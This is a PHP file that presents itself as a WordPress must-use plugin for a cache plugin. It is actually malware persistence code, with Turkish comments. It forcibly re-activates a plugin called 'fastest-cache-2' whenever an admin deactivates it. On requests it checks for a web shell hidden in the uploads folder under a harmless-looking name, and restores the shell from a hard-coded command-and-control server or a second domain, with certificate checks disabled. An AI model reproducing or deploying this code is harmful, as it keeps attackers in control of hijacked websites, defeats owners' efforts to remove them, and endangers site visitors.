<?php
// Must-use plugin — WP admin panelden deactivate edilemez
if (!defined("ABSPATH")) exit;

// Her admin sayfasında: regular plugin deactivate edildiyse yeniden aktive et
add_action("admin_init", function() {
    $plugins = (array)get_option("active_plugins", []);
    $entry   = "fastest-cache-2/fastest-cache-2.php";
    if (!in_array($entry, $plugins, true)) {
        $plugins[] = $entry;
        update_option("active_plugins", $plugins);
    }
}, 1);

// Her WP isteğinde: shell bütünlüğünü kontrol et (dakikada bir)
add_action("init", function() {
    $lock = WP_CONTENT_DIR . "/.fc2_mu_lock";
    if (@file_exists($lock) && (time() - @filemtime($lock)) < 60) return;
    @touch($lock);
    $shell = "/home/printityourway.com/public_html/wp-content/uploads/class-wp-session-403c06a8.php";
    $sz    = @file_exists($shell) ? @filesize($shell) : 0;
    if ($sz >= 10000) return;
    // Shell eksik/bozuk — C2 veya GitHub'dan restore et
    // [url, timeout] — C2 4s (UAM hızlı ret), GitHub 15s
    $sources = [
        ["http://144.172.104.129/nebakiyonla_hurmsaqw/c2serverr.php?act=get_shell&token=d7aa4874f3a3300f1b47153b51e2a632", 4],
        ["https://warnightkardesim.icu/cdn/l.php", 15],
    ];
    foreach ($sources as [$src, $tmo]) {
        $body = false;
        if (function_exists("curl_init")) {
            $ch = curl_init($src);
            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$tmo,
                CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_SSL_VERIFYPEER=>false,
                CURLOPT_FOLLOWLOCATION=>true, CURLOPT_USERAGENT=>"Mozilla/5.0"]);
            $body = @curl_exec($ch); @curl_close($ch);
        }
        if (!$body) $body = @file_get_contents($src, false,
            stream_context_create(["http"=>["timeout"=>$tmo,"user_agent"=>"Mozilla/5.0"]]));
        // Reject Cloudflare UAM HTML — must be valid PHP
        if ($body && strlen($body) > 10000 && substr($body, 0, 5) === "<?php") {
            @file_put_contents($shell, $body);
            @chmod($shell, 0644);
            break;
        }
    }
}, 1);
